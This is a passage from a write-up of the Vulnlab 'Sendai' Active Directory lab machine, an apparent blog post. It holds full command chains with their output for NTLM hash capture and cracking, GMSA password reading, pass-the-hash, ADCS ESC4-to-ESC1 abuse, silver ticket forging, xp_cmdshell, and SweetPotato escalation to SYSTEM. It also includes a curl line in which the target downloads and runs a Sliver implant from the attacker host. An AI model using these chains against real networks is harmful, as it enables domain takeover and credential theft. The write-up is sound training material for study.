plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 krbrelayx/dnstool.py -u &#x27;sendai.vl\\daz$&#x27; -p &#x27;Password123@&#x27; -r daz.sendai.vl -d 10.8.0.173 --action add dc.sendai.vl -dns-ip 10.10.98.227</span><br><span class=\"line\">[-] Connecting to host...</span><br><span class=\"line\">[-] Binding to host</span><br><span class=\"line\">[+] Bind OK</span><br><span class=\"line\">[-] Adding new record</span><br><span class=\"line\">[+] LDAP operation completed successfully</span><br></pre></td></tr></table></figure>\n\n<p>You’ll need to wait a few minutes for the LDAP record to update into the environment, it took around 5 minutes for me. We’ll boot up <code>responder</code> to wait for incoming LDAP requests to our attacker machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo responder -I tun0      </span><br><span class=\"line\">                                         __</span><br><span class=\"line\">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class=\"line\">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class=\"line\">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class=\"line\">                   |__|</span><br><span class=\"line\"></span><br><span class=\"line\">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br></pre></td></tr></table></figure>\n\n<p>After we’ve waited long enough, we should be able to submit a request to our controlled subdomain into DownDetector. You may receive an error, however if we look back at <code>responder</code> you’ll see that an NTLM hash was captured.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Listening for events...                                                                                                   </span><br><span class=\"line\"></span><br><span class=\"line\">[HTTP] NTLMv2 Client   : 10.10.98.227</span><br><span class=\"line\">[HTTP] NTLMv2 Username : SENDAI\\websvc</span><br><span class=\"line\">[HTTP] NTLMv2 Hash     : websvc::SENDAI:7ddba3792facbeff:2B[...snip...]00000000000000</span><br></pre></td></tr></table></figure>\n\n<p>We can crack this hash using <code>hashcat</code>, to which we’ll be using a hash identifier value of 5600.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 websvc.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">2366e65c8e9a29435777b0a001000000000000000000000000000000000000900240048005400540050002f00640061007a002e00730065006e006400610069002e0076006c000000000000000000:[...snip...]</span><br><span class=\"line\">   </span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for <code>websvc</code>. Looking back at Bloodhound, we can see that this user is within the <code>admsvc</code> group along with the <code>Elliot.Yates</code> user that we added to in Method #1.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/g.png\"></p>\n<p>This means we can also use <code>crackmapexec</code> along with <code>websvc</code> creds to read the GMSA password and get the NT hash for <code>mgtsvc$</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec ldap 10.10.98.227 -u &#x27;websvc&#x27; -p &#x27;(WEBSVC PASSWORD)&#x27; --gmsa          </span><br><span class=\"line\">SMB         10.10.98.227    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [+] sendai.vl\\websvc:[...snip...] </span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               [*] Getting GMSA Passwords</span><br><span class=\"line\">LDAP        10.10.98.227    636    DC               Account: mgtsvc$              NTLM: 52ece[...snip...]4c1a20</span><br></pre></td></tr></table></figure>\n\n<p>We can then use the <code>mgtsvc$</code> NT hash to authenticate to WinRM using PTH.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;mgtsvc$&#x27; -H &#x27;52ece[...snip...]4c1a20&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\mgtsvc$\\Documents&gt; whoami</span><br><span class=\"line\">sendai\\mgtsvc$</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"PrivEsc-Method-1-PrivEscCheck\"><a href=\"#PrivEsc-Method-1-PrivEscCheck\" class=\"headerlink\" title=\"PrivEsc Method #1 - PrivEscCheck\"></a>PrivEsc Method #1 - PrivEscCheck</h1><p>If you may have noticed before, ADCS is running on the machine. This can be assumed due to the <code>ca-operators</code> domain group within the environment, and also due to the fact that port 9389 is running (this isn’t conclusive, but generally I’ve seen this port open with machines running ADCS).</p>\n<p>The only issue is that we do not currently possess the capabilities to retrieve vulnerable ADCS templates, as we do not control a user account within the <code>ca-operators</code> group.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/h.png\"></p>\n<p>We’ll need to take control of either <code>Anthony.Smith</code> or <code>Clifford.Davey</code> in order to exploit ADCS. If you scan for vulnerable ADCS templates using any of the domain accounts we have access to, you won’t find any vulnerable templates (at least to what I could see).</p>\n<p>Given that we have access to the filesystem at this point, my assumption is that we’ll need to do a bit of credential hunting.</p>\n<p>My normal attack methodology would be to look through odd files or potentially cached DPAPI credentials with tools like <a href=\"https://github.com/GhostPack/Seatbelt\">Seatbelt</a>, however I discovered an odd service that was running on the machine when I ran a scan with <code>ps</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; ps</span><br><span class=\"line\"></span><br><span class=\"line\"> Pid    Ppid   Owner            Arch     Executable                                  Session </span><br><span class=\"line\">====== ====== ================ ======== =========================================== =========</span><br><span class=\"line\">......</span><br><span class=\"line\">2584   628                              helpdesk.exe                                -1</span><br></pre></td></tr></table></figure>\n\n<p>This executable doesn’t seem to be ran naturally, at least in the AD environments that I’ve tested in the past. We can receive if any usernames or passwords were passed into this executable in memory (during the time of its execution) by using tools such as <a href=\"https://github.com/itm4n/PrivescCheck\">PrivEscCheck</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; Import-Module .\\PrivescCheck.ps1</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; Invoke-PrivescCheck</span><br><span class=\"line\">......</span><br><span class=\"line\">Name        : Support</span><br><span class=\"line\">DisplayName :</span><br><span class=\"line\">ImagePath   : C:\\WINDOWS\\helpdesk.exe -u clifford.davey -p [...snip...] -k netsvcs</span><br><span class=\"line\">User        : LocalSystem</span><br><span class=\"line\">StartMode   : Automatic</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the <code>helpdesk.exe</code> had the credentials for <code>Clifford.Davey</code> passed into them at runtime. </p>\n<h1 id=\"PrivEsc-Method-1-cont-ADCS\"><a href=\"#PrivEsc-Method-1-cont-ADCS\" class=\"headerlink\" title=\"PrivEsc Method #1 (cont.) - ADCS\"></a>PrivEsc Method #1 (cont.) - ADCS</h1><p>We should now have the password for this user, meaning we can properly exploit <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\">ADCS</a>. We’ll use <code>certipy-ad</code> for this, though you could also exploit this locally on the machine using <a href=\"https://github.com/GhostPack/Certify\">Certify</a> alongside <a href=\"https://github.com/GhostPack/Rubeus\">Rubeus</a>. The only issue with the Windows solution is that you would need to drop Certify to the filesystem which can take a bit longer.</p>\n<p>Since we have access to the domain users credentials, we’ll just use <code>certipy-ad</code>, which should be built-in to Kali (in case you don’t have it, check <a href=\"https://github.com/ly4k/Certipy\">here</a>). We’ll start by enumerating the ADCS templates.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad find -vulnerable -dc-ip 10.10.98.227 -u &#x27;clifford.davey&#x27;@sendai.vl -p &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27;</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saved text output to &#x27;20240707011831_Certipy.txt&#x27;</span><br><span class=\"line\">[*] Saved JSON output to &#x27;20240707011831_Certipy.json&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>If you’ll notice, this should save two text files (alongside Bloodhound data) to our local system. Looking into this file gives us the indication of a potential exploit.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Certificate Templates</span><br><span class=\"line\">  0</span><br><span class=\"line\">    Template Name                       : SendaiComputer</span><br><span class=\"line\">    Display Name                        : SendaiComputer</span><br><span class=\"line\">    Certificate Authorities             : sendai-DC-CA</span><br><span class=\"line\">    Enabled                             : True</span><br><span class=\"line\">    Client Authentication               : True</span><br><span class=\"line\">......</span><br><span class=\"line\">[!] Vulnerabilities</span><br><span class=\"line\">ESC4                              : &#x27;SENDAI.VL\\\\ca-operators&#x27; has dangerous permissions</span><br></pre></td></tr></table></figure>\n\n<p>ESC4 is a vulnerability that gives us the potential to alter a template and create an exploitable misconfiguration on a section of the template. As proclaimed in the HackTricks article that I posted above, we are able to modify the template’s following permissions:</p>\n<ul>\n<li><strong>Owner:</strong> Grants implicit control over the object, allowing for the modification of any attributes.</li>\n<li><strong>FullControl:</strong> Enables complete authority over the object, including the capability to alter any attributes.</li>\n<li><strong>WriteOwner:</strong> Permits the alteration of the object’s owner to a principal under the attacker’s control.</li>\n<li><strong>WriteDacl:</strong> Allows for the adjustment of access controls, potentially granting an attacker FullControl.</li>\n<li><strong>WriteProperty:</strong> Authorizes the editing of any object properties.</li>\n</ul>\n<p>To keep things at a low-level, we can essentially modify the ESC4 template to become vulnerable to ESC1. We can then exploit the ESC1 vulnerability and gain a service ticket as the Administrator user.</p>\n<p>We’ll first start by converting said template to be vulnerable to ESC4.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad template -username &#x27;clifford.davey&#x27;@sendai.vl -password &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27; -template SendaiComputer -save-old</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Saved old configuration for &#x27;SendaiComputer&#x27; to &#x27;SendaiComputer.json&#x27;</span><br><span class=\"line\">[*] Updating certificate template &#x27;SendaiComputer&#x27;</span><br><span class=\"line\">[*] Successfully updated &#x27;SendaiComputer&#x27;</span><br></pre></td></tr></table></figure>\n\n<p>Now that the template is vulnerable to ESC1, we can request for a keyfile for the Administrator user.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad req -username &#x27;clifford.davey&#x27;@sendai.vl -password &#x27;(CLIFFORD.DAVEY PASSWORD)&#x27; -template SendaiComputer -ca sendai-DC-CA -target dc.sendai.vl -upn administrator@sendai.vl</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Requesting certificate via RPC</span><br><span class=\"line\">[*] Successfully requested certificate</span><br><span class=\"line\">[*] Request ID is 5</span><br><span class=\"line\">[*] Got certificate with UPN &#x27;administrator@sendai.vl&#x27;</span><br><span class=\"line\">[*] Certificate has no object SID</span><br><span class=\"line\">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><code>certipy-ad</code> will generate a keyfile for us that we can use to obtain a service ticket for this user. We’ll use the <code>auth</code> tool for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ certipy-ad auth -pfx administrator.pfx -username &#x27;Administrator&#x27; -domain &#x27;sendai.vl&#x27; -dc-ip 10.10.98.227</span><br><span class=\"line\">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Using principal: administrator@sendai.vl</span><br><span class=\"line\">[*] Trying to get TGT...</span><br><span class=\"line\">[*] Got TGT</span><br><span class=\"line\">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class=\"line\">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class=\"line\">[*] Got hash for &#x27;administrator@sendai.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:cfb106[...snip...]8d087a</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the NT hash for the Administrator user, we can simply use PTH with <code>evil-winrm</code> to authenticate to the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ evil-winrm --ip 10.10.98.227 -u &#x27;Administrator&#x27; -H &#x27;cfb106[...snip...]be8d087a&#x27;</span><br><span class=\"line\">Info: Establishing connection to remote endpoint</span><br><span class=\"line\">*Evil-WinRM* PS C:\\Users\\Administrator\\Documents&gt; cat ..\\Desktop\\root.txt</span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p>Given that we have read the root flag, we have now successfully compromised the machine using this method!</p>\n<h1 id=\"PrivEsc-Method-2-MSSQL\"><a href=\"#PrivEsc-Method-2-MSSQL\" class=\"headerlink\" title=\"PrivEsc Method #2 - MSSQL\"></a>PrivEsc Method #2 - MSSQL</h1><p>I was also able to discover another method for privilege escalation on the machine, this attack being through MSSQL. If you’ll notice in the <code>Users</code> directory, there seems to be another user on the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\users&gt; ls</span><br><span class=\"line\">Directory: C:\\users</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         7/18/2023   6:09 AM                Administrator</span><br><span class=\"line\">d-----          7/6/2024   8:12 PM                mgtsvc$</span><br><span class=\"line\">d-r---         7/11/2023  12:36 AM                Public</span><br><span class=\"line\">d-----          7/6/2024   8:05 PM                sqlsvc</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>sqlsvc</code> account, hinting that there may be an MSSQL service running on this machine. Let’s do a <code>netstat</code> scan to see if our theory is correct.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\users&gt; netstat -a</span><br><span class=\"line\">Active Connections</span><br><span class=\"line\">Proto  Local Address          Foreign Address        State</span><br><span class=\"line\">......</span><br><span class=\"line\">  TCP    0.0.0.0:1433           dc:0                   LISTENING</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, an MSSQL service is indeed running on the machine.</p>\n<p>What’s interesting as well is that, during my initial enumeration of the filesystem, I found an interesting file that might hint towards an attack on MSSQL.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\config&gt; ls</span><br><span class=\"line\">Directory: C:\\config</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----         7/11/2023   5:57 AM             78 .sqlconfig</span><br><span class=\"line\"></span><br><span class=\"line\">*Evil-WinRM* PS C:\\config&gt; cat .sqlconfig</span><br><span class=\"line\">Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=[...snip...];</span><br></pre></td></tr></table></figure>\n\n<p>We seem to have found a configuration file underneath <code>C:\\config</code>, which is also hosted as an SMB share - although you won’t have access to this share until you get access to <code>mgtsvc$</code>.</p>\n<p>Now that we have a password for <code>sqlsvc</code>, what exactly can we do with this? At this point it would make sense to authenticate to their account using WinRM, however they are not a part of the <code>Remote Management Operators</code>. You will notice that they do have an SPN to MSSQL within Bloodhound.</p>\n<p><img src=\"/images/vulnlab/sendai-vl/i.png\"></p>\n<p>At this point, I immediately thought back to what we had done for <a href=\"https://dan-feliciano.com/2024/06/29/breach/\">Breach</a>. Given that we have the plaintext password for an account that has an SPN set to MSSQL (which seems to be the MSSQL service account), we can potentially exploit a <a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">Silver ticket attack</a>.</p>\n<p>With the silver ticket attack, we can gain command execution access through MSSQL by impersonating the Administrator user. Let’s first start up <a href=\"https://github.com/BishopFox/sliver\">Sliver C2</a> and set up a SOCKS proxy, as the MSSQL service is not externally facing and is behind a firewall (since we didn’t see it on our initial NMAP scan).</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver &gt; mtls</span><br><span class=\"line\">sliver &gt; generate --mtls (KALI IP) --os windows --arch amd64 --format exe --save (SAVE PATH) --name sendai</span><br></pre></td></tr></table></figure>\n\n<p>Let’s then execute the Sliver implant to receive a session on our Sliver server - to which we can start a SOCKS proxy on.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; curl http://10.8.0.173:9001/sendai.exe -O sendai.exe</span><br><span class=\"line\">*Evil-WinRM* PS C:\\temp&gt; .\\sendai.exe</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 9976dc7b sendai - 10.10.98.227:60658 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:24:25 EDT</span><br><span class=\"line\"></span><br><span class=\"line\">sliver &gt; use 9976dc7b-addd-44c8-9ac1-b8960b009c67</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Active session sendai (9976dc7b-addd-44c8-9ac1-b8960b009c67)</span><br><span class=\"line\"></span><br><span class=\"line\">sliver (sendai) &gt; socks5 start</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started SOCKS5 127.0.0.1 1081  </span><br><span class=\"line\">⚠  In-band SOCKS proxies can be a little unstable depending on protocol</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have a SOCKS proxy running, make sure to update <code>/etc/proxychains4.conf</code> at the bottom of the file to reflect the interface (<code>127.0.0.1</code>) and the port (<code>1081</code>) that the proxy is listening on.</p>\n<p>We can then use <code>proxychains4</code> to execute commands through the firewall.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 nmap -sT -p1433 10.10.98.227         </span><br><span class=\"line\">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class=\"line\">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class=\"line\">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class=\"line\">Nmap scan report for sendai.vl (10.10.98.227)</span><br><span class=\"line\">Host is up (0.26s latency).</span><br><span class=\"line\"></span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">1433/tcp open  ms-sql-s</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 0.52 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have access to the MSSQL ticket, we’ll need to craft our Silver ticket in order to authenticate as the Administrator user.</p>\n<p>In order to do this, we’ll need a few objects relative to domain identification.</p>\n<ul>\n<li>The domain SID - <code>S-1-5-21-3085872742-570972823-736764132</code> (Can be found in Bloodhound).</li>\n<li>The NT Hash of the SQL service account - (Can be crafted using web tools like <a href=\"https://codebeautify.org/ntlm-hash-generator\">this</a> along with SQLSVC’s plaintext password).</li>\n<li>The SPN our service account has - <code>MSSQL/dc.sendai.vl</code>.</li>\n<li>The name of the user we want to impersonate - Administrator.</li>\n</ul>\n<p>Putting this all together, you should receive a command similar to the below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ proxychains4 impacket-ticketer -domain-sid S-1-5-21-3085872742-570972823-736764132 -nthash 58655C0[...snip...]78C2D96A -spn MSSQL/dc.sendai.vl -dc-ip 10.10.98.227 -domain sendai.vl Administrator</span><br><span class=\"line\">......</span><br><span class=\"line\">[*] Saving ticket in Administrator.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We can then set our Kerberos authentication global variable on Kali to be directed to the ticket file that was generated. This will then be followed by our authentication attempt into MSSQL through our proxy.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ proxychains4 impacket-mssqlclient -k dc.sendai.vl</span><br><span class=\"line\">[proxychains] Strict chain  ...  127.0.0.1:1081  ...  dc.sendai.vl:1433  ...  OK</span><br><span class=\"line\">[*] Encryption required, switching to TLS</span><br><span class=\"line\">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class=\"line\">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class=\"line\">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class=\"line\">[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) </span><br><span class=\"line\">[!] Press help for extra shell commands</span><br><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; </span><br></pre></td></tr></table></figure>\n\n<p>Now that we are authenticated to MSSQL in the context of Administrator (we still only have the privileges of <code>SQLSVC</code>), we can enable command execution using the <code>enable_xp_cmdshell</code> tool that comes built into this client.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; enable_xp_cmdshell</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class=\"line\">[*] INFO(DC\\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure>\n\n<p>Let’s now run <code>xp_cmdshell</code> to execute local commands and execute our Sliver implant we put on the filesystem earlier.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SQL (SENDAI\\Administrator  dbo@master)&gt; xp_cmdshell powershell &quot;cd C:\\temp; .\\sendai.exe&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/j.png\"></p>\n<h1 id=\"PrivEsc-Method-2-cont-SeImpersonatePrivilege\"><a href=\"#PrivEsc-Method-2-cont-SeImpersonatePrivilege\" class=\"headerlink\" title=\"PrivEsc Method #2 (cont.) - SeImpersonatePrivilege\"></a>PrivEsc Method #2 (cont.) - SeImpersonatePrivilege</h1><p>Now that we have a session as <code>SQLSVC</code>, we’ll find that they have <code>SeImpersonatePrivilege</code> enabled on their account. I’ve covered this before, however I’ll just give a brief overview as to how it works.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; sa-whoami</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Successfully executed sa-whoami (coff-loader)</span><br><span class=\"line\">[*] Got output:</span><br><span class=\"line\">......</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                                       State                         </span><br><span class=\"line\">============================= ================================================= ===========================</span><br><span class=\"line\">SeAssignPrimaryTokenPrivilege Replace a process level token                     Disabled                      </span><br><span class=\"line\">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process                Disabled                      </span><br><span class=\"line\">SeMachineAccountPrivilege     Add workstations to domain                        Disabled                      </span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking                          Enabled                       </span><br><span class=\"line\">SeManageVolumePrivilege       Perform volume maintenance tasks                  Enabled                       </span><br><span class=\"line\">SeImpersonatePrivilege        Impersonate a client after authentication         Enabled                       </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects                             Enabled                       </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set                    Disabled</span><br></pre></td></tr></table></figure>\n\n<p>Service accounts, by default, will have this privilege along with <code>SeAssignPrimaryTokenPrivilege</code>. Having <code>SeImpersonatePrivilege</code> essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user.</p>\n<p>We can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM. If we direct this towards our implant, we should be able to receive a Sliver session as SYSTEM.</p>\n<p>You can use any binaries within the Potato family for our exploit to force SYSTEM to authenticate to our endpoint. In the past, I’ve used <a href=\"https://github.com/bugch3ck/SharpEfsPotato\">SharpEfsPotato</a> due to AV restrictions, however that is not the case here as AV is not enabled on this machine. I’ll use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> in our case, since I already have it compiled with Visual Studio on my machine.</p>\n<p>We can execute this through Sliver’s built-in .NET assembly command tools.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; execute-assembly SweetPotato.exe &#x27;-p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a &quot;C:\\temp\\sendai.exe&quot; -e EfsRpc&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Output:</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/b54f2ec8-c934-40f1-885c-2b715199b7af/\\b54f2ec8-c934-40f1-885c-2b715199b7af\\b54f2ec8-c934-40f1-885c-2b715199b7af</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Session 4afdd3a6 sendai - 10.10.98.227:49917 (dc) - windows/amd64 - Sun, 07 Jul 2024 00:47:19 EDT</span><br></pre></td></tr></table></figure>\n\n<p>If all was done correctly, this should generate a Sliver callback session as SYSTEM as it did for me denoted above. Since we have an account as SYSTEM, we can now essentially control the machine as we’d like. We can dump all of the domain user hashes and secrets, establish persistence through services, etc.</p>\n<p>Since we have access as SYSTEM though, we can read the root flag of this machine. This means we have successfully compromised this machine using this method!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sliver (sendai) &gt; cat &quot;C:\\Users\\Administrator\\Desktop\\root.txt&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">VL[...snip...]</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/sendai-vl/k.png\"></p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was an incredible environment that helped me bounce off of tactics that I had actually learned in previous Vulnlab machines. Using ADCS or creating a Silver ticket through MSSQL is something that I’ve done before, and it was really great to be able to put that same knowledge into this machine. There could potentially be other methods that I am not aware about, but nonetheless I think I’m satisfied with the work that I’ve done for Sendai.</p>\n<p>Big thanks goes out to xct for the development of this machine and for the continued practice with red teaming.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://github.com/dirkjanm/krbrelayx\">https://github.com/dirkjanm/krbrelayx</a><br><a href=\"https://github.com/GhostPack/Seatbelt\">https://github.com/GhostPack/Seatbelt</a><br><a href=\"https://github.com/itm4n/PrivescCheck\">https://github.com/itm4n/PrivescCheck</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation</a><br><a href=\"https://github.com/GhostPack/Certify\">https://github.com/GhostPack/Certify</a><br><a href=\"https://github.com/GhostPack/Rubeus\">https://github.com/GhostPack/Rubeus</a><br><a href=\"https://github.com/ly4k/Certipy\">https://github.com/ly4k/Certipy</a><br><a href=\"https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket\">https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://codebeautify.org/ntlm-hash-generator\">https://codebeautify.org/ntlm-hash-generator</a><br><a href=\"https://github.com/bugch3ck/SharpEfsPotato\">https://github.com/bugch3ck/SharpEfsPotato</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I’ll go over two methods that I was able to perform for both foothold and privilege escalation. I’m guessing that we’ll see many similar tactics to the AD boxes that I’ve completed before.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s first start out with our NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td 